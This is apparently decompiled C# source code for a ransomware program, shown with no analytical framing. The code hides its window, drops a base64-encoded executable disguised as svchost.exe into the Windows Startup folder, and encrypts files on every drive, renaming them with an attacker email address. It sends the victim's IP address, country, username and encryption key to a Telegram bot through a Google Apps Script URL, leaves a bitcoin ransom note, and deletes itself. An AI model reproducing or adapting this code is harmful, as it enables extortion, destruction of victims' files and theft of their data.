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[...string is too long...]";
			string str = Environment.GetEnvironmentVariable("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
			File.WriteAllBytes(str + "\\svchost.exe", Convert.FromBase64String(s));
			new Process
			{
				StartInfo = new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Normal,
					FileName = str + "\\svchost.exe"
				}
			}.Start();
			Process currentProcess = Process.GetCurrentProcess();
			string text = "@echo off\n";
			text = text + "TASKKILL /F /IM \"" + currentProcess.ProcessName + ".exe\"\n";
			text = text + "break>" + currentProcess.ProcessName + "\n";
			text = text + "DEL -f \"" + currentProcess.ProcessName + ".exe\"\n";
			text += "break>\"%~f0\" && DEL \"%~f0\"\n";
			using (StreamWriter streamWriter = new StreamWriter("killme.bat"))
			{
				streamWriter.Write(text);
			}
			new Process
			{
				StartInfo = new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					FileName = "cmd.exe",
					Arguments = "/C killme.bat >> NUL"
				}
			}.Start();
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002324 File Offset: 0x00000524
		private static void EncryptFile(string file)
		{
			try
			{
				byte[] bytes = Program.Encrypt(File.ReadAllBytes(file));
				File.WriteAllBytes(file, bytes);
				File.Move(file, string.Concat(new string[]
				{
					file,
					".[",
					Program.email,
					"]-[",
					Program.ID,
					"]",
					Program.frmt
				}));
				Program.count++;
				Console.WriteLine(Program.count.ToString());
			}
			catch
			{
				Console.WriteLine("Error EncryptFile");
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000023C8 File Offset: 0x000005C8
		private static void SendMsg(string msg)
		{
			string text = "https://script.google.com";
			text += "/macros/s/AKfycb";
			text += "zxgX8puIgB5uXelJ2wNzxa8VbheV463rBm6_SpEau";
			text = text + "-D2v4g0q1/exec?bot_token=" + Program.token;
			text += "&method=send";
			text += "Message&args={\"text\":\"";
			text = text + msg + "\"";
			text += ",\"chat_id\":\"";
			text = text + Program.userid + "\"}";
			Program.http_get(text);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002454 File Offset: 0x00000654
		private static void DirSearch(string sDir)
		{
			try
			{
				if (!sDir.Contains("\\AppData\\") && !sDir.Contains("\\ProgramData\\") && !sDir.Contains("\\Windows\\") && !sDir.Contains("[" + Program.email + "]"))
				{
					foreach (string str in Directory.GetFiles(sDir))
					{
						File.AppendAllText(Path.GetTempPath() + "\\list.lst", str + Environment.NewLine);
					}
					string[] directories = Directory.GetDirectories(sDir);
					foreach (string sDir2 in directories)
					{
						Program.DirSearch(sDir2);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000253C File Offset: 0x0000073C
		private static void DirList()
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				List<string> list = new List<string>();
				foreach (DriveInfo driveInfo in drives)
				{
					list.Add(driveInfo.RootDirectory.ToString());
				}
				if (File.Exists(Path.GetTempPath() + "\\End.lst"))
				{
					File.Delete(Path.GetTempPath() + "\\End.lst");
				}
				foreach (string sDir in list)
				{
					Program.DirSearch(sDir);
				}
				File.WriteAllText(Path.GetTempPath() + "\\End.lst", "Encripted");
			}
			catch
			{
				Console.WriteLine("Error DirList");
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002628 File Offset: 0x00000828
		private static void Encrypt()
		{
			try
			{
				string fileName = Process.GetCurrentProcess().MainModule.FileName;
				File.Move(Path.GetTempPath() + "\\list.lst", Path.GetTempPath() + "\\get_list.lst");
				string[] array = File.ReadAllLines(Path.GetTempPath() + "\\get_list.lst");
				File.Delete(Path.GetTempPath() + "\\get_list.lst");
				foreach (string fileName2 in array)
				{
					FileInfo fileInfo = new FileInfo(fileName2);
					if (Program.limit_size != -1 && fileInfo.Length <= (long)Program.limit_size && fileInfo.FullName != fileName)
					{
						if (Program.list_format.Length > 1)
						{
							if (Program.lsfrmt.Contains(fileInfo.Extension))
							{
								Program.EncryptFile(fileInfo.FullName);
							}
						}
						else
						{
							Program.EncryptFile(fileInfo.FullName);
						}
					}
					else if (Program.limit_size == -1 && fileInfo.FullName != fileName)
					{
						if (Program.list_format.Length > 1)
						{
							if (Program.lsfrmt.Contains(fileInfo.Extension))
							{
								Program.EncryptFile(fileInfo.FullName);
							}
						}
						else
						{
							Program.EncryptFile(fileInfo.FullName);
						}
					}
				}
			}
			catch
			{
				Console.WriteLine("Error Encrypt");
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000027A8 File Offset: 0x000009A8
		private static void Lunch()
		{
			string environmentVariable = Environment.GetEnvironmentVariable("COMPUTERNAME");
			byte[] array = new byte[9];
			Random random = new Random();
			random.NextBytes(array);
			string text = Convert.ToBase64String(array).Replace("=", "").Replace("/", "").Replace("+", "");
			Program.ID = text;
			Program.KEY = Program.GenerateKey();
			string str = Convert.ToBase64String(Program.KEY).Replace("+", "$");
			string text2 = Program.http_get("https://api.myip.com");
			text2 = text2.Replace("{", string.Empty).Replace("}", string.Empty);
			string[] array2 = new string[]
			{
				",\""
			};
			string[] array3 = text2.Split(array2, 3, StringSplitOptions.RemoveEmptyEntries);
			array3[0] = array3[0].Replace("\"", string.Empty);
			array3[1] = array3[1].Replace("\"", string.Empty);
			array3[2] = array3[2].Replace("\"", string.Empty);
			array2[0] = ":";
			string str2 = array3[0].Split(array2, 2, StringSplitOptions.RemoveEmptyEntries)[1];
			string text3 = array3[1].Split(array2, 2, StringSplitOptions.RemoveEmptyEntries)[1];
			string a = array3[2].Split(array2, 2, StringSplitOptions.RemoveEmptyEntries)[1];
			if (!text3.StartsWith("Iran") && a != "IR")
			{
				"ID : " + text + "\n";
				string text4 = "Malware Excuted !!!\\n";
				text4 = text4 + "ID: " + text + "\\n";
				text4 = text4 + "IpAddres: " + str2 + "\\n";
				text4 = text4 + "Country : " + text3 + "\\n";
				text4 = text4 + "Key: " + str + "\\n";
				string text5 = text4;
				text4 = string.Concat(new string[]
				{
					text5,
					"User: ",
					Program.username,
					"\\\\",
					environmentVariable,
					"\\n"
				});
				text5 = text4;
				text4 = string.Concat(new string[]
				{
					text5,
					"Format: .[",
					Program.email,
					"]-[",
					Program.ID,
					"]",
					Program.frmt,
					"\\n"
				});
				Program.SendMsg(text4);
				Program.DirList();
				Program.Encrypt();
				"ID : " + text + "\n";
				text4 = "Malware Excuted !!!\\n";
				text4 = text4 + "ID: " + text + "\\n";
				text4 = text4 + "IpAddres: " + str2 + "\\n";
				text4 = text4 + "Country : " + text3 + "\\n";
				text4 = text4 + "Key: " + str + "\\n";
				text5 = text4;
				text4 = string.Concat(new string[]
				{
					text5,
					"User: ",
					Program.username,
					"\\\\",
					environmentVariable,
					"\\n"
				});
				text5 = text4;
				text4 = string.Concat(new string[]
				{
					text5,
					"Format: .[",
					Program.email,
					"]-[",
					Program.ID,
					"]",
					Program.frmt,
					"\\n"
				});
				text4 = text4 + "Files: " + Program.count.ToString() + "\\n";
				Program.SendMsg(text4);
				File.WriteAllText(Environment.GetEnvironmentVariable("TEMP") + "\\msgta.txt", "ID : " + text + "\n" + Program.msgtoadmin);
			}
			else
			{
				Console.WriteLine("You Are Iranian :)");
				Console.WriteLine("-----------------");
				Console.WriteLine("Press Any Key ...");
				Console.ReadKey();
				Environment.Exit(1);
			}
		}

		// Token: 0x0600000C RID: 12
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x0600000D RID: 13 RVA: 0x00002BCC File Offset: 0x00000DCC
		private static void Main(string[] args)
		{
			IntPtr mainWindowHandle = Process.GetCurrentProcess().MainWindowHandle;
			Program.ShowWindow(mainWindowHandle, 0);
			Program.Lunch();
			Program.SelfDestroy();
		}

		// Token: 0x04000001 RID: 1
		private static byte[] KEY;

		// Token: 0x04000002 RID: 2
		private static string frmt = ".AMJIXIUS";

		// Token: 0x04000003 RID: 3
		private static int limit_size = -1;

		// Token: 0x04000004 RID: 4
		private static string[] list_format = "".Split("-".ToCharArray());

		// Token: 0x04000005 RID: 5
		private static List<string> lsfrmt = new List<string>();

		// Token: 0x04000006 RID: 6
		private static string token = "1410078323:AAEO76pEwelDuhEBIb7BC9Ug5EBkE4iy7Mc";

		// Token: 0x04000007 RID: 7
		private static string userid = "1415521766";

		// Token: 0x04000008 RID: 8
		private static string msgtoadmin = Encoding.ASCII.GetString(Convert.FromBase64String("QWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZA0KDQpDb250YWN0IHVzIHRvIHRoaXMgZW1haWwgdG8gZGVjcnlwdCB5b3VyIGZpbGVzOg0KYW5jcnlwdGVkMUBnbWFpbC5jb20NCkluIGNhc2Ugb2Ygb2Ygbm8gYW5zd2VyIGluIDI0IGhvdXJzIGNvbnRhY3QgdGhlIHNlY29uZGFyeSBlbWFpbDoNCmFuY3J5cHRlZDFAZ21haWwuY29tDQoNCllvdSBjYW4gdW5sb2NrIHRoZW0gYnkgYnV5aW5nIHRoZSBzcGVjaWFsIGtleSBnZW5lcmF0ZWQgZm9yIHlvdQ0KDQpGcmVlIGRlY3J5cHRpb24gYXMgZ3VhcmFudGVlDQpCZWZvcmUgcGF5aW5nIHlvdSBjYW4gc2VuZCB1cyB1cCB0byA1IGZpbGVzIGZvciBmcmVlIGRlY3J5cHRpb24uIFRoZSB0b3RhbCBzaXplIG9mIGZpbGVzIG11c3QgYmUgbGVzcyB0aGFuIDRNYiAobm9uIGFyY2hpdmVkKSxhbmQgZmlsZXMgc2hvdWxkIG5vdCBjb250YWluIHZhbHVhYmxlIGluZm9ybWF0aW9uLiAoZGF0YWJhc2VzLGJhY2t1cHMsbGFyZ2UgZXhjZWwgc2hlZXRzLCBldGMuKQ0KDQoNClBheW1lbnQgaXMgcG9zc2libGUgb25seSB3aXRoIGJpdGNvaW4gDQoNCkhvdyB0byBvYnRhaW4gYml0Y29pbnMNClRoZSBlYXNvd2F5IHRvIGJ1eSBiaXRjb2lucyBpcyBMb2NhbEJpdGNvaW5zIHNpdGUuIHlvdSBoYXZlIHRvIHJlZ2lzdGVyLCBjbGljayA/QnV5IGJpdGNvaW5zPywgYW5kIHNlbGVjdCB0aGUgc2VsbGVyIGJ5IHBheW1lbnQgbWV0aG9kIGFuZCBwcmljZS4NCkh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20vYnV5X2JpdGNvaW5zDQpBbHNvIHlvdSBjYW4gZnVuZCBvdGhlciBwbGFjZXMgdG8gYnV5IEJpdGNvaW5zIGFuZCBiZWdpbm5lcnMgZ3VpZGUgaGVyZToNCkh0dHA6Ly93d3cuY29pbmRlc2suY29tL2luZm9ybWF0aW9uL2hvdy1jYW4taS1idXktYml0Y29pbnMvDQoNCkF0dGVudGlvbiAhISENCjEuIERvIG5vdCByZW5hbWUgZW5jcnlwdGVkIGZpbGVzLg0KMi4gRG8gbm90IHRyeSB0byBkZWNyeXB0IHlvdXIgZGF0YSB1c2luZyB0aGlyZCBwYXJ0eSBzb2Z0d2FyZXMsIGl0IG1heSBjYXVzZSBwZXJtYW5lbnQgZGF0YSBsb3NzLg0KMy4gRGVjcnlwdGlvbiBvciB5b3VyIGZpbGVzIHdpdGggdGhlIGhlbHAgb2YgdGhpcmQgcGFydGllcyBtYXkgY2F1c2UgaW5jcmVhc2VkIHByaWNlKHRoZXkgYWRkIHRoZWlyIGZlZSB0byBvdXJzKSBvciB5b3UgY2FuIGJlY29tZSBhIHZpY3RpbSBvZiBhIHNjYW0="));

		// Token: 0x04000009 RID: 9
		private static string email = "ancrypted1@gmail.com";

		// Token: 0x0400000A RID: 10
		private static string ID = "";

		// Token: 0x0400000B RID: 11
		private static int count = 0;

		// Token: 0x0400000C RID: 12
		private static string username = Environment.GetEnvironmentVariable("USERNAME");

		// Token: 0x0400000D RID: 13
		internal static IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;

		// Token: 0x0400000E RID: 14
		internal static int WTS_UserName = 5;
	}
}
